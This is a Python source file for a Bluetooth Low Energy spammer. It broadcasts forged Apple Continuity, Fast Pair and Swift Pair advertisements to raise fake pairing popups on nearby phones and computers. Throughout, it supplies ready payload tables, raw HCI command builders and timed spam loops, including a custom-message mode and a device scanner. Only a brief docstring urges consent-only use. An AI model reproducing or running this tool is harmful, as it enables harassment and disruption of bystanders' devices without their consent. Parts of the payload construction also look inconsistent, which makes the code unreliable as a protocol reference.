"""
BLE Advertisement spammer.
Sends fake BLE pairing/device advertisements that trigger popup
notifications on nearby phones — the same trick the Flipper Zero does.

Targets:
  - iOS (Apple Continuity protocol)  — works on iOS < 17.2, older devices
  - Android Samsung Fast Pair        — works on most Android versions
  - Windows Swift Pair

Uses hcitool + hciconfig via subprocess (BlueZ, no extra Python libs needed).
Requires: sudo apt install bluez

IMPORTANT: Use responsibly. Only use near people who have consented (friends,
your own devices). Do not use in public spaces.
"""
from __future__ import annotations

import logging
import subprocess
import time
import struct
from typing import Optional

log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Apple Continuity manufacturer data payloads
# Apple Company ID = 0x004C
# ---------------------------------------------------------------------------

# Each entry: (display_name, manufacturer_data_hex)
APPLE_PAYLOADS = {
    # AirPods Pro pairing popup
    'AirPods Pro':       '4c001907024e1a2f00000000000000000000000000',
    # AirPods (2nd gen)
    'AirPods 2':         '4c0019070319282f00000000000000000000000000',
    # AirPods Max
    'AirPods Max':       '4c001907200a192f00000000000000000000000000',
    # Apple TV setup popup
    'Apple TV Setup':    '4c0004000000000000000000',
    # iPhone Nearby popup
    'iPhone Nearby':     '4c001006031e9ede00f74600',
    # Apple Watch pairing
    'Apple Watch':       '4c000601fa2000',
    # HomePod setup
    'HomePod Setup':     '4c0004000000000000000000',
    # MacBook Pro
    'MacBook Nearby':    '4c001006031e9ede00f74600',
}

# ---------------------------------------------------------------------------
# Samsung Fast Pair payloads
# Samsung Company ID = 0x0075
# Fast Pair model IDs trigger "Connect <device>" popups on Android
# ---------------------------------------------------------------------------

SAMSUNG_PAYLOADS = {
    'Galaxy Buds Pro':   '0000F5BB',  # Fast Pair model ID
    'Galaxy Buds 2':     '00005B2F',
    'Galaxy Buds Live':  '00004743',
    'Galaxy Watch 4':    '00008F7D',
}

# ---------------------------------------------------------------------------
# Windows Swift Pair payload
# Microsoft Company ID = 0x0006
# ---------------------------------------------------------------------------

WINDOWS_PAYLOADS = {
    'Xbox Controller':   '060030ea',
    'Surface Headphones':'060030ea',
}


class BLEAdvertiser:
    def __init__(self, interface: str = 'hci0') -> None:
        self._iface = interface
        self._advertising = False

    # -----------------------------------------------------------------------
    # Low-level HCI commands via hcitool
    # -----------------------------------------------------------------------

    def _hci_cmd(self, *args) -> tuple[bool, str]:
        cmd = ['sudo', 'hcitool', '-i', self._iface] + list(args)
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            return result.returncode == 0, result.stderr.strip()
        except Exception as e:
            return False, str(e)

    def _hciconfig(self, *args) -> tuple[bool, str]:
        cmd = ['sudo', 'hciconfig', self._iface] + list(args)
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            return result.returncode == 0, result.stderr.strip()
        except Exception as e:
            return False, str(e)

    def _set_adv_data_raw(self, hex_data: str) -> bool:
        """Set raw LE advertisement data via hcitool cmd."""
        # Build the HCI LE Set Advertising Data command
        # OGF=0x08, OCF=0x0008
        data_bytes = bytes.fromhex(hex_data.replace(' ', ''))
        length = len(data_bytes)
        padded = data_bytes + b'\x00' * (31 - length)
        payload = f'{length:02x} ' + ' '.join(f'{b:02x}' for b in padded)
        cmd = ['sudo', 'hcitool', '-i', self._iface, 'cmd',
               '0x08', '0x0008', payload]
        try:
            result = subprocess.run(
                ' '.join(cmd), shell=True, capture_output=True, text=True, timeout=5
            )
            return result.returncode == 0
        except Exception:
            return False

    def _build_apple_adv(self, manufacturer_hex: str) -> str:
        """
        Build a full BLE advertisement payload for Apple Continuity.
        Format: len, type=0xFF (manufacturer specific), data
        """
        data = bytes.fromhex(manufacturer_hex)
        length = len(data) + 1  # +1 for type byte
        adv = bytes([length, 0xFF]) + data
        return adv.hex()

    def _build_fast_pair_adv(self, model_id_hex: str) -> str:
        """
        Build a Google Fast Pair service advertisement.
        Service UUID: 0xFE2C, with 3-byte model ID.
        """
        model = bytes.fromhex(model_id_hex)
        # Service data AD type = 0x16, UUID 0xFE2C (little-endian)
        adv = bytes([6, 0x16, 0x2C, 0xFE]) + model[:3]
        return adv.hex()

    # -----------------------------------------------------------------------
    # Start / stop advertising
    # -----------------------------------------------------------------------

    def _start_advertising(self) -> bool:
        """Enable BLE advertising."""
        self._hciconfig('up')
        # LE Set Advertise Enable = 1
        ok, _ = self._hci_cmd('cmd', '0x08', '0x000A', '01')
        self._advertising = ok
        return ok

    def _stop_advertising(self) -> None:
        self._hci_cmd('cmd', '0x08', '0x000A', '00')
        self._advertising = False

    def _set_adv_params(self) -> None:
        """Set advertising interval to ~100ms, non-connectable undirected."""
        # Min interval=0x00A0 (100ms), Max interval=0x00A0, type=0x03 (non-connectable)
        self._hci_cmd('cmd', '0x08', '0x0006',
                      'A0 00 A0 00 03 00 00 00 00 00 00 00 00 07 00')

    # -----------------------------------------------------------------------
    # Public API
    # -----------------------------------------------------------------------

    def is_available(self) -> bool:
        try:
            result = subprocess.run(['hciconfig', self._iface],
                                    capture_output=True, text=True, timeout=3)
            return result.returncode == 0
        except FileNotFoundError:
            return False

    def spam_apple(self,
                   payload_name: str = 'AirPods Pro',
                   duration_s: float = 30.0,
                   interval_s: float = 0.1) -> None:
        """
        Continuously broadcast an Apple Continuity advertisement.
        Triggers pairing/device popups on nearby iPhones (iOS < 17.2).
        """
        manufacturer_hex = APPLE_PAYLOADS.get(payload_name)
        if not manufacturer_hex:
            raise ValueError(f'Unknown Apple payload: {payload_name}')

        adv_hex = self._build_apple_adv(manufacturer_hex)
        self._set_adv_params()

        log.info('BLE Apple spam: %s for %.1fs', payload_name, duration_s)
        deadline = time.time() + duration_s

        while time.time() < deadline:
            self._set_adv_data_raw(adv_hex)
            self._start_advertising()
            time.sleep(interval_s)
            self._stop_advertising()
            time.sleep(0.05)

        self._stop_advertising()
        log.info('BLE Apple spam complete')

    def spam_android(self,
                     payload_name: str = 'Galaxy Buds Pro',
                     duration_s: float = 30.0,
                     interval_s: float = 0.1) -> None:
        """
        Continuously broadcast a Fast Pair advertisement.
        Triggers "Connect <device>" popups on nearby Android phones.
        """
        model_hex = SAMSUNG_PAYLOADS.get(payload_name)
        if not model_hex:
            raise ValueError(f'Unknown Android payload: {payload_name}')

        adv_hex = self._build_fast_pair_adv(model_hex)
        self._set_adv_params()

        log.info('BLE Android spam: %s for %.1fs', payload_name, duration_s)
        deadline = time.time() + duration_s

        while time.time() < deadline:
            self._set_adv_data_raw(adv_hex)
            self._start_advertising()
            time.sleep(interval_s)
            self._stop_advertising()
            time.sleep(0.05)

        self._stop_advertising()
        log.info('BLE Android spam complete')

    def spam_custom(self,
                    message: str,
                    target: str = 'apple',
                    duration_s: float = 30.0) -> None:
        """
        Spam with a custom message embedded in the advertisement name field.
        Sets the BLE local name to your custom message.
        """
        # Encode message as Complete Local Name (type 0x09)
        encoded = message.encode('utf-8')[:28]
        name_ad = bytes([len(encoded) + 1, 0x09]) + encoded

        # Add flags (type 0x01, value 0x06 = LE General Discoverable + BR/EDR not supported)
        flags_ad = bytes([0x02, 0x01, 0x06])

        if target.lower() == 'apple':
            # Add Apple manufacturer data for the popup trigger
            mfr = bytes.fromhex(APPLE_PAYLOADS['AirPods Pro'])
            mfr_ad = bytes([len(mfr) + 1, 0xFF]) + mfr
            adv = flags_ad + name_ad + mfr_ad
        else:
            # Android: Fast Pair + custom name
            fp = bytes.fromhex(self._build_fast_pair_adv(SAMSUNG_PAYLOADS['Galaxy Buds Pro']))
            adv = flags_ad + name_ad + fp

        adv_hex = adv[:31].hex()
        self._set_adv_params()

        log.info('BLE custom spam: %r -> %s for %.1fs', message, target, duration_s)
        deadline = time.time() + duration_s

        while time.time() < deadline:
            self._set_adv_data_raw(adv_hex)
            self._start_advertising()
            time.sleep(0.1)
            self._stop_advertising()
            time.sleep(0.05)

        self._stop_advertising()

    def scan_nearby(self, duration_s: float = 10.0) -> list[dict]:
        """Scan for nearby BLE devices."""
        log.info('BLE scan for %.1fs', duration_s)
        try:
            result = subprocess.run(
                ['sudo', 'timeout', str(int(duration_s)),
                 'hcitool', 'lescan', '--duplicates'],
                capture_output=True, text=True, timeout=duration_s + 3
            )
            devices = []
            seen = set()
            for line in result.stdout.splitlines():
                parts = line.strip().split(' ', 1)
                if len(parts) == 2:
                    mac, name = parts
                    if mac not in seen and ':' in mac:
                        seen.add(mac)
                        devices.append({'mac': mac, 'name': name})
            return devices
        except Exception as e:
            log.error('BLE scan error: %s', e)
            return []

    def stop(self) -> None:
        self._stop_advertising()
